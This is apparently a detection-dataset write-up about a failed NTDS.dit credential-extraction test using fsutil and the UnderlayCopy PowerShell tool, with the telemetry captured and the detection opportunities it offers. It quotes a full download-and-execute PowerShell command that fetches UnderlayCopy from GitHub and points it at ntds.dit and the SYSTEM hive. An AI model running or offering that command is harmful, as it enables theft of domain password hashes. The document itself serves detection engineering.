# T1003.003-11: NTDS — Copy NTDS in low level NTFS acquisition via fsutil

## Technique Context

T1003.003 (NTDS) represents one of the most critical credential access techniques, where attackers attempt to extract the Active Directory database (NTDS.dit) containing password hashes for all domain accounts. Traditional methods involve using Volume Shadow Copy Service (VSS) or directly copying the database while it's locked. This specific test demonstrates a more sophisticated approach using low-level NTFS filesystem operations via fsutil to query file extents and perform direct disk reads, potentially bypassing file-level locks and some security controls.

The detection community focuses heavily on NTDS access attempts because successful extraction provides attackers with the crown jewels of Active Directory environments. Key detection points include attempts to access the NTDS.dit file path, usage of backup utilities, Volume Shadow Copy operations, and unusual file system utilities. The fsutil-based approach is particularly interesting because it attempts to read files at the cluster level rather than through normal file system APIs.

## What This Dataset Contains

This dataset captures a failed attempt to copy NTDS.dit using a PowerShell script that downloads the "UnderlayCopy" tool from GitHub. The key events include:

**Process Creation Chain:**
- Security 4688 shows the initial PowerShell execution with command line: `"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR https://raw.githubusercontent.com/kfallahi/UnderlayCopy/37f2e9b76b724bc1211437b14deaf1e76b21791e/UnderlayCopy.ps1 -UseBasicParsing) Underlay-Copy -Mode Metadata -SourceFile C:\Windows\NTDS\ntds.dit -DestinationFile C:\Windows\Temp\ntds.dit Underlay-Copy -Mode Metadata -SourceFile C:\Windows\System32\config\SYSTEM -DestinationFile C:\Windows\Temp\SYSTEM_HIVE}`
- Sysmon EID 1 captures fsutil.exe execution: `"C:\Windows\system32\fsutil.exe" file queryextents C:\Windows\NTDS\ntds.dit`

**Network Activity:**
- PowerShell 4103 shows `Invoke-WebRequest` downloading the UnderlayCopy script from GitHub

**File System Operations:**
- PowerShell 4103 shows `Get-Item` attempting to access `C:\Windows\NTDS\ntds.dit` with error: "Cannot find path 'C:\Windows\NTDS\ntds.dit' because it does not exist"
- fsutil.exe exits with status 0x1, and PowerShell errors show "The system cannot find the path specified"

**Process Behavior:**
- Multiple Sysmon EID 10 events show PowerShell processes accessing other processes with full access rights (0x1FFFFF)
- Security 4703 shows token privilege adjustment enabling SeBackupPrivilege and other high-privilege rights

## What This Dataset Does Not Contain

The technique failed because this workstation is not a domain controller - the NTDS.dit file doesn't exist at `C:\Windows\NTDS\ntds.dit`. As a result, we don't see:

- Successful file extent enumeration from fsutil
- Actual low-level disk reads using the Volume device handle (`\\.\C:`)
- Creation of copied NTDS.dit or SYSTEM hive files in C:\Windows\Temp\
- Evidence of successful NTFS metadata parsing or MFT record reading

The dataset does capture the complete attack methodology and tool download, but the actual credential access phase fails due to the target file not existing. This represents attempt telemetry rather than success telemetry, which is common when techniques are tested against inappropriate targets.

## Assessment

This dataset provides excellent visibility into the initial stages of a sophisticated NTDS extraction technique. The telemetry quality is strong across all data sources:

- **Process telemetry** from both Sysmon and Security logs captures the full command-line execution chain
- **PowerShell logging** provides detailed visibility into the script download, function definitions, and execution attempts
- **Network indicators** show the external tool download from GitHub

The main limitation is that the technique fails early due to the missing target file, so we don't observe the actual low-level NTFS operations that make this technique notable. However, this still provides valuable detection opportunities for the preparatory stages and tool acquisition.

## Detection Opportunities Present in This Data

1. **Command line detection on PowerShell executing with NTDS.dit file path references** - Security 4688 and Sysmon EID 1 both capture the full command line mentioning the target credential database path

2. **Network-based detection of UnderlayCopy tool download** - PowerShell 4103 CommandInvocation events show Invoke-WebRequest accessing the specific GitHub repository hosting this credential access tool

3. **fsutil.exe execution with file extent queries** - Sysmon EID 1 captures fsutil being used for `file queryextents` operations, which is unusual for legitimate administrative tasks and indicates potential low-level file access attempts

4. **PowerShell script block logging of NTFS manipulation code** - PowerShell 4104 events contain the complete UnderlayCopy function definitions including Win32 API calls for direct filesystem access, MFT parsing, and volume handle operations

5. **Process access patterns indicating credential access preparation** - Multiple Sysmon EID 10 events show PowerShell processes accessing other processes with maximum rights (0x1FFFFF), consistent with preparing for privileged file operations

6. **Privilege escalation detection via token right adjustments** - Security 4703 shows SeBackupPrivilege and other high-level privileges being enabled, which is required for bypassing file system security

7. **Suspicious file path combinations in command lines** - Detection of both NTDS.dit and SYSTEM registry hive being targeted simultaneously, indicating credential dumping preparation

8. **GitHub repository indicators for known credential access tools** - The specific URL pattern `github.com/kfallahi/UnderlayCopy` represents a known tool for advanced NTDS extraction techniques
